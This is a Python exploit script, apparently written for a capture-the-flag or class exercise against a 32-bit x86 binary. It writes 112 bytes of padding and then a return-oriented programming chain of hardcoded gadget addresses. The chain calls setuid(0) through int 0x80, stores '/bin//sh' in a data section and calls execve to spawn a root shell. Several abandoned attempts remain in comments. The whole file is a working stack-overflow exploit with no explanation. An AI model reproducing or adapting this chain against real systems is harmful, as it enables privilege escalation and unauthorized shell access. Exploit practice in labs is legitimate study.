import sys
bin_sh = b'/bin/sh'

clear_eax = (0x080563d0).to_bytes(4, 'little')

clear_edx_pop_ebx_set_eax_to_zero_pop_esi_pop_edi = (0x0805c653).to_bytes(4, 'little')
add_11_to_eax = (0x08095682).to_bytes(4, 'little')
clear_ecx_int_80 = (0x08072d61).to_bytes(4, 'little')
pop_eax = (0x080ac7b6).to_bytes(4, 'little')
pop_edx = (0x0807299b).to_bytes(4, 'little')
pop_ebx = (0x080481d1).to_bytes(4, 'little')
mov_eax_18_edx = (0x08072ca0).to_bytes(4, 'little')

inc_eax = (0x0807fe39).to_bytes(4, 'little')
push_eax = (0x080870dc).to_bytes(4, 'little')


mov_eax_edx = (0x080a09b4).to_bytes(4, 'little')
inc_eax = (0x0805e8ad).to_bytes(4, 'little')

int_80_ret = (0x080732d0).to_bytes(4, 'little')

data_addr = (0x080de060).to_bytes(4, 'little')
data_addr_plus_4 = (0x080de064).to_bytes(4, 'little')

nops = (0x90).to_bytes(1, 'little')
sys.stdout.buffer.write(nops * 112)

# construct an overflow
""""
highest_num = (0x08057080).to_bytes(4, 'little')

sys.stdout.buffer.write(pop_ebx)
sys.stdout.buffer.write(push_eax)
"""
val_ebx = (0x0805ead1).to_bytes(4, 'little')
inc_ebx = (0x080ccbb1).to_bytes(4, 'little')
mov_edx_to_esi = (0x0806ee6f).to_bytes(4, 'little')
everything = (0x080a6b1c).to_bytes(4, 'little')

"""
sys.stdout.buffer.write(clear_eax)
sys.stdout.buffer.write(pop_edx)
sys.stdout.buffer.write((0xfff6ae40).to_bytes(4, 'little'))
sys.stdout.buffer.write(mov_edx_to_esi)
sys.stdout.buffer.write(everything)"""

sys.stdout.buffer.write(pop_ebx)
sys.stdout.buffer.write((0xffffffff).to_bytes(4, 'little'))
sys.stdout.buffer.write(inc_ebx)

sys.stdout.buffer.write(clear_eax)
sys.stdout.buffer.write(inc_eax)
sys.stdout.buffer.write(inc_eax)
sys.stdout.buffer.write(inc_eax)
sys.stdout.buffer.write(inc_eax)
sys.stdout.buffer.write(inc_eax)
sys.stdout.buffer.write(inc_eax)
sys.stdout.buffer.write(inc_eax)
sys.stdout.buffer.write(inc_eax)
sys.stdout.buffer.write(inc_eax)
sys.stdout.buffer.write(inc_eax)
sys.stdout.buffer.write(inc_eax)
sys.stdout.buffer.write(inc_eax)
sys.stdout.buffer.write(inc_eax)
sys.stdout.buffer.write(inc_eax)
sys.stdout.buffer.write(inc_eax)
sys.stdout.buffer.write(inc_eax)
sys.stdout.buffer.write(inc_eax)
sys.stdout.buffer.write(inc_eax)
sys.stdout.buffer.write(inc_eax)
sys.stdout.buffer.write(inc_eax)
sys.stdout.buffer.write(inc_eax)
sys.stdout.buffer.write(inc_eax)
sys.stdout.buffer.write(inc_eax)
sys.stdout.buffer.write(int_80_ret)

sys.stdout.buffer.write(pop_edx)
sys.stdout.buffer.write(b'/bin')
sys.stdout.buffer.write(pop_eax)
sys.stdout.buffer.write(data_addr)
sys.stdout.buffer.write(mov_eax_edx)
sys.stdout.buffer.write(pop_edx)
sys.stdout.buffer.write(b'//sh')
sys.stdout.buffer.write(pop_eax)
sys.stdout.buffer.write(data_addr_plus_4)
sys.stdout.buffer.write(mov_eax_edx)

# sys.stdout.buffer.write(bin_sh)
# address_bin_sh = (0xfff6adc8).to_bytes(4, 'little')
# sys.stdout.buffer.write(nops * 1)
sys.stdout.buffer.write(clear_edx_pop_ebx_set_eax_to_zero_pop_esi_pop_edi)
sys.stdout.buffer.write(data_addr)
sys.stdout.buffer.write(nops * 8)
# sys.stdout.buffer.write(bin_sh)
sys.stdout.buffer.write(add_11_to_eax)
sys.stdout.buffer.write(nops * 4)
sys.stdout.buffer.write(clear_ecx_int_80)




# sys.stdout.buffer.write(nops * 80)
# return_addr = (0xfff6add0).to_bytes(4, 'little')
# sys.stdout.buffer.write(return_addr)

"""
sys.stdout.buffer.write(nops * 112)

sys.stdout.buffer.write(highest_num)
sys.stdout.buffer.write(inc_eax)
sys.stdout.buffer.write(push_eax)
sys.stdout.buffer.write(push_eax)
sys.stdout.buffer.write(push_eax)
sys.stdout.buffer.write(push_eax)
"""